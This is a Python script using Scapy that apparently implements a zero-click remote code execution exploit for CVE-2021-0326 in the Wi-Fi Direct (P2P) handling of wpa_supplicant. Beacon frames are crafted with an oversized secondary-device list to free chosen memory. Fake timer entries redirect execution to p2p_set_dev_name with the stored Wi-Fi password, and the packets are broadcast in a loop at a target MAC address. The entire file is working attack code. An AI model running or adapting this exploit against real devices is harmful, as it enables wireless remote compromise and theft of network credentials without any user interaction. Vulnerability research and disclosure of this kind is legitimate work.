from scapy.all import *
import argparse

desc = """
Skeleton (but pronounced like Peloton):
A 0-click RCE exploit for CVE-2021-0326

Austin Emmitt of Nowsecure (@alkalinesec)
"""

parser = argparse.ArgumentParser(description=desc,
    formatter_class=argparse.RawTextHelpFormatter)

parser.add_argument('-i', dest='interface', required=True,
    help='network interface in monitor mode')
parser.add_argument('-t', dest='target', required=True, 
    help='target MAC address')
parser.add_argument('--exploit', action='store_true', help='free arbitrary address')
args = parser.parse_args()

iface = args.interface        # interface in monitor mode
target = args.target          # target MAC address

base  = 0x558ed61000          # base address of main module

eloop = 0x7fb6e32780          # eloop_timeout address
p2    = 0x7fb6e2f320          # second part of payload
p2p_data = 0x7fb6e98000       # first parm of p2p_set_dev_name
passwd   = 0x7fb6e2b460       # address of Wi-Fi password

eloop_next = base + 0x1f0770  # eloop next (&list terminates)
# wpa_printf = base + 0x027d48  # addr of wpa_printf

p2p_set_dev_name = base + 0x060c3c

frees = [eloop-0x20] if args.exploit else [] # list of addrs to free (up to 10)
sec_devs = 0x12+len(frees)    # number of secondary device types

p64 = lambda x: struct.pack("<Q", x)

def build_beacon(dev_mac, client_mac):
    group = (
        client_mac + b"CCCCCC\xffDDEEEEEEEE" +  # p2p client information
        struct.pack("<B", sec_devs) +           # secondary dev count
        b"\x00"*(sec_devs*8-8*len(frees)-4) +   # nulls to fill up sec devs
        b"".join(p64(x) for x in frees) +       # addresses to be freed
        b"\x00\x00\x00\x00\x10\x11\x00\x00")    # empty device name 

    group = struct.pack("<B", len(group)) + group # p2p group info 
    p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
        b"\x09\x03\x06\x00" + dev_mac +          # p2p device id, group info
        b"\x0e" +                                # p2p group info identifier
        struct.pack("<H", len(group)) + group))  # len of group info 

    ext_data1 = (
        p64(p2) +          # next: address of ext_data2
        p64(eloop_next) +  # previous: address of terminator
        b"\x00"*16)        # times filled with 00 so it doesnt reorder

    vendor1 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b"\x04\x10\x49" +                    # vendor extension id
        struct.pack(">H", len(ext_data1)) +  # length of 1st payload
        ext_data1))                          # 1st payload data

    ext_data2 = (
        p64(eloop_next) +            # next: address of terminator
        p64(eloop) +                 # previous: address of ext_data1
        p64(0) + p64(0) +            # times set to 0 so it runs right away
        p64(p2p_data) + p64(passwd) +      # arguments of p2p_set_dev_name function
        p64(p2p_set_dev_name) +            # addr of p2p_set_dev_name to jump to 
        p64(0))

    vendor2 = Dot11EltVendorSpecific(oui=0x0050f2, info=(
        b"\x04\x10\x49" +                    # vendor extension id
        struct.pack(">H", len(ext_data2)) +  # length of 2nd payload
        ext_data2))                          # 2nd payload data

    mac = RandMAC() # (fake) mac address of source 
    dot11 = Dot11FCS(addr1=target, addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info='DIRECT-XX') 
    rates = Dot11Elt(ID='Rates', info=b"\x48")    
    rsn = Dot11Elt(ID='RSNinfo', info=(
        b"\x01\x00"          # RSN Version 1
        b"\x00\x0f\xac\x02"  # Group Cipher Suite : 00-0f-ac TKIP
        b"\x02\x00"          # 2 Pairwise Cipher Suites 
        b"\x00\x0f\xac\x04"  # AES Cipher
        b"\x00\x0f\xac\x02"  # TKIP Cipher
        b"\x01\x00"          # 1 Authentication Key Managment Suite 
        b"\x00\x0f\xac\x02"  # Pre-Shared Key
        b"\x00\x00"))        # RSN Capabilities 

    # assemble packet
    packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p

    # add fake eloop_timeout elements
    for vendor in (vendor1, vendor2):
        for i in range(5):
            packet = packet / vendor

    return packet 

mac1 = b"AAAAAA"  # first dev MAC
mac2 = b"BBBBBB"  # first client MAC

# two packets with swapped addresses 
# to free at least ones vendor_ext
packet1 = build_beacon(mac1, mac2)
packet2 = build_beacon(mac2, mac1)

print("sending exploit to %s" % target)
sendp([packet1, packet2], iface=iface, inter=0.100, loop=1)
